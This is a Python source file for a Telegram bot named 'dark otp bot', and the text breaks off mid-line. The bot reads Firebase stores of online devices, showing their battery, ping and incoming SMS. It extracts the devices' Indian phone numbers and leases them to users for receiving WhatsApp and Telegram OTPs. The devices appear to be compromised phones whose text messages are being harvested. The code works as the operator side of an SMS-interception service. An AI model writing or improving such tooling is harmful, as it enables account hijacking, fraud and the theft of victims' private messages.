from aiogram import Router, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
import random, time, asyncio, logging, re
import database as db
import firebase_utils as fbu
from utils.ui import sc, btn
from utils.helper import clear_user_lease, get_countries, get_servers_grouped, is_owner, get_ist_time_str
from states import S
import config

log = logging.getLogger("UserHandler")
user_router = Router()

def main_kb(uid):
    d = db.load_data()
    is_vip = uid in d.get("vip_users", []) or is_owner(uid)
    kb = [
        [btn("get number", "user:get_num", "📱"), btn("my numbers", "user:saved", "⭐")],
        [btn("otp history", "user:history", "📜"), btn("help/support", "user:support", "🆘")]
    ]
    if is_vip:
        kb.append([btn("upcoming ws otps", "user:upcoming", "📅")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

@user_router.message(CommandStart())
async def cmd_start(msg: Message):
    uid = msg.from_user.id
    d = db.load_data()
    clear_user_lease(uid)
    if str(uid) not in d["users"]:
        d["users"][str(uid)] = {"name": msg.from_user.full_name, "joined": int(time.time()), "otp_history": [], "saved_numbers": {}}
        db.save_data(d)

    if uid == config.MAIN_OWNER or is_owner(uid):
        from handlers.admin import admin_home_msg
        await admin_home_msg(msg)
        return

    await msg.answer(f"👋 <b>{sc('welcome to dark otp bot')}</b>\n{sc('select an option below')}:", reply_markup=main_kb(uid), parse_mode="HTML")

@user_router.callback_query(F.data == "user:home")
async def user_home(cq: CallbackQuery):
    await cq.answer()
    clear_user_lease(cq.from_user.id)
    try: await cq.message.edit_text(f"👋 <b>{sc('main menu')}</b>", reply_markup=main_kb(cq.from_user.id), parse_mode="HTML")
    except: pass

@user_router.callback_query(F.data == "user:get_num")
async def user_get_num(cq: CallbackQuery):
    await cq.answer()
    clear_user_lease(cq.from_user.id)
    d = db.load_data()
    countries = get_countries(d)
    if not countries: return await cq.message.edit_text("❌ No servers available.", parse_mode="HTML")
    kb = [[btn(c, f"user:country:{c}", "🌍")] for c in countries]
    kb.append([btn("main menu", "user:home", "🏠")])
    await cq.message.edit_text(f"🌍 <b>{sc('select country')}:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@user_router.callback_query(F.data.startswith("user:country:"))
async def user_country(cq: CallbackQuery):
    await cq.answer()
    country = cq.data.split(":")[2]
    d = db.load_data()
    servers = get_servers_grouped(d, country)
    if not servers: return await cq.message.edit_text("No servers in this country.")
    
    is_vip = cq.from_user.id in d.get("vip_users", []) or is_owner(cq.from_user.id)
    
    if is_vip:
        kb = [
            [btn("whatsapp", f"user:service:{country}:whatsapp", "💬")],
            [btn("telegram", f"user:service:{country}:telegram", "✈️")],
            [btn("any service", f"user:service:{country}:any", "🌐")],
            [btn("back", "user:get_num", "🔙")]
        ]
        await cq.message.edit_text(f"🌍 {country} - <b>{sc('select service')}:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    else:
        kb = []
        for i, srv in enumerate(servers):
            ping = await fbu.check_ping(srv[0]["url"], srv[0].get("auth"))
            kb.append([btn(f"server {i+1} ({ping})", f"user:server:{country}:{i}", "📁")])
        kb.append([btn("back", "user:get_num", "🔙")])
        await cq.message.edit_text(f"🌍 {country} - <b>{sc('servers')}:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@user_router.callback_query(F.data.startswith("user:service:"))
async def user_service(cq: CallbackQuery):
    await cq.answer()
    parts = cq.data.split(":")
    country, service = parts[2], parts[3]
    uid = cq.from_user.id
    clear_user_lease(uid)
    d = db.load_data()
    servers = get_servers_grouped(d, country)
    
    try: await cq.message.edit_text(f"🔄 {sc('fetching')} {service} {sc('lines')}...", parse_mode="HTML")
    except: pass
    
    used = d.setdefault("used_devices", {}).setdefault(str(uid), {})
    now = int(time.time())
    
    async def fetch_clients_data(fb):
        clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        return fb, clients
        
    tasks = [fetch_clients_data(fb) for fb in servers[0]]
    results = await asyncio.gather(*tasks)
    
    p1, p2, p3 = [], [], []
    
    for fb_i, (fb, clients) in enumerate(results):
        if not clients or not isinstance(clients, dict): continue
        for dev_id, c in clients.items():
            if not isinstance(c, dict): continue
            is_online = c.get("status") is True or (c.get("ping", {}).get("ts", 0) > (now - 900) * 1000)
            if is_online:
                msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=20", fb.get("auth"))
                msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
                
                chance = 97
                if service == "whatsapp":
                    chance = fbu.get_ws_chance(msgs)
                
                if chance >= 95: p1.append((fb_i, fb, dev_id, c, chance))
                elif chance >= 80: p2.append((fb_i, fb, dev_id, c, chance))
                else: p3.append((fb_i, fb, dev_id, c, chance))
                
    if p1: fb_i, fb, dev_id, dev_data, chance = random.choice(p1)
    elif p2: fb_i, fb, dev_id, dev_data, chance = random.choice(p2)
    elif p3: fb_i, fb, dev_id, dev_data, chance = random.choice(p3)
    else: return await cq.message.edit_text("❌ No lines found for this service.", parse_mode="HTML")
    
    used[dev_id] = now
    data = db.load_data()
    data["used_devices"][str(uid)] = used
    msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=100", fb.get("auth"))
    msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
    last_id = int(msgs[-1].get("id", 0)) if msgs else 0
    
    best_nums = fbu.extract_best_numbers(dev_data, msgs)
    is_backup = False
    if not best_nums:
        backups = data.get("device_backups", {}).get(dev_id, {}).get("numbers", [])
        if backups:
            best_nums = [(n, "Backup") for n in backups]
            is_backup = True

    real_health = fbu.calculate_health(msgs)
    base_label = fb.get("label", f"Base {fb_i+1}")
    top_num = best_nums[0][0] if best_nums else "Unknown"
    
    data["user_leases"][str(uid)] = {
        "dev_id": dev_id, "fb_url": fb["url"], "base_idx": base_label, "numbers": [n for n, c in best_nums],
        "expire_at": int(time.time()) + 3600, "health": real_health, "last_msg_id": last_id, "top_number": top_num
    }
    db.save_data(data)
    
    is_vip = uid in data.get("vip_users", []) or is_owner(uid)
    display_health = real_health if is_vip else 10
    
    nums_text = ""
    kb_nums = []
    if best_nums:
        for n, c in best_nums:
            conf_text = "Backup" if c == "Backup" else f"{c}%"
            nums_text += f"📞 <code>+91{n}</code> | {conf_text}\n"
            kb_nums.append([InlineKeyboardButton(text=f"Copy +91{n}", copy_text=CopyTextButton(text=f"+91{n}"))])
    else:
        nums_text = f"⚠️ <b>{sc('extracting number...')}</b>"
        
    battery = str(dev_data.get("battery", "100")).replace("%", "")
    if not battery or battery == "?": battery = "100"
    
    text = (
        f"📱 <b>{sc('details')}</b>\n"
        f"🔥 {sc('srv')}: {fb_i+1} | {base_label}\n"
        f"🆔 <code>{dev_id[:12]}...</code> | ⚙️ {battery}T | ❤️ {display_health}/10\n"
        f"📊 {sc('chance')}: <b>{chance}%</b>\n\n"
        f"{nums_text}"
    )
    kb = kb_nums + [
        [btn("info", f"user:info:{dev_id}", "ℹ️"), btn("save number", f"user:save:{dev_id}", "⭐")],
        [btn("set timer", f"user:set_timer:{dev_id}", "⏰")],
        [btn("next number", f"user:service:{country}:{service}", "🔄"), btn("stop", "user:stop", "⏹")],
        [btn("back", f"user:country:{country}", "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@user_router.callback_query(F.data.startswith("user:server:"))
async def user_server(cq: CallbackQuery):
    await cq.answer()
    parts = cq.data.split(":")
    country, idx = parts[2], int(parts[3])
    uid = cq.from_user.id
    clear_user_lease(uid)
    d = db.load_data()
    servers = get_servers_grouped(d, country)
    if idx >= len(servers): return await cq.message.edit_text("Server not found!")
    try: await cq.message.edit_text(f"🔄 {sc('fetching fresh number')}...", parse_mode="HTML")
    except: pass
    
    used = d.setdefault("used_devices", {}).setdefault(str(uid), {})
    now = int(time.time())
    async def fetch_clients_data(fb):
        clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        return fb, clients
        
    tasks = [fetch_clients_data(fb) for fb in servers[idx]]
    results = await asyncio.gather(*tasks)
    
    available, repeat, all_devs = [], [], []
    for fb_i, (fb, clients) in enumerate(results):
        if not clients or not isinstance(clients, dict): continue
        for dev_id, c in clients.items():
            if not isinstance(c, dict): continue
            is_online = c.get("status") is True or (c.get("ping", {}).get("ts", 0) > (now - 900) * 1000)
            if is_online:
                all_devs.append((fb_i, fb, dev_id, c))
                last_used = used.get(dev_id, 0)
                if now - last_used > 86400: available.append((fb_i, fb, dev_id, c))
                elif now - last_used > 43200: repeat.append((fb_i, fb, dev_id, c))
                
    is_rep = False
    if available: fb_i, fb, dev_id, dev_data = random.choice(available)
    elif repeat: fb_i, fb, dev_id, dev_data = random.choice(repeat); is_rep = True
    elif all_devs: fb_i, fb, dev_id, dev_data = random.choice(all_devs); is_rep = True
    else: return await cq.message.edit_text("❌ No online lines in this server.", parse_mode="HTML")
        
    used[dev_id] = now
    data = db.load_data()
    data["used_devices"][str(uid)] = used
    msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=100", fb.get("auth"))
    msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
    last_id = int(msgs[-1].get("id", 0)) if msgs else 0
    
    best_nums = fbu.extract_best_numbers(dev_data, msgs)
    is_backup = False
    if not best_nums:
        backups = data.get("device_backups", {}).get(dev_id, {}).get("numbers", [])
        if backups:
            best_nums = [(n, "Backup") for n in backups]
            is_backup = True

    real_health = fbu.calculate_health(msgs)
    base_label = fb.get("label", f"Base {fb_i+1}")
    top_num = best_nums[0][0] if best_nums else "Unknown"
    
    data["user_leases"][str(uid)] = {
        "dev_id": dev_id, "fb_url": fb["url"], "base_idx": base_label, "numbers": [n for n, c in best_nums],
        "expire_at": int(time.time()) + 3600, "health": real_health, "last_msg_id": last_id, "top_number": top_num
    }
    db.save_data(data)
    
    is_vip = uid in data.get("vip_users", []) or is_owner(uid)
    display_health = real_health if is_vip else 10
    rep_mark = " #" if is_rep else ""
    
    nums_text = ""
    kb_nums = []
    if best_nums:
        for n, c in best_nums:
            conf_text = "Backup" if c == "Backup" else f"{c}%"
            nums_text += f"📞 <code>+91{n}</code> | {conf_text}\n"
            kb_nums.append([InlineKeyboardButton(text
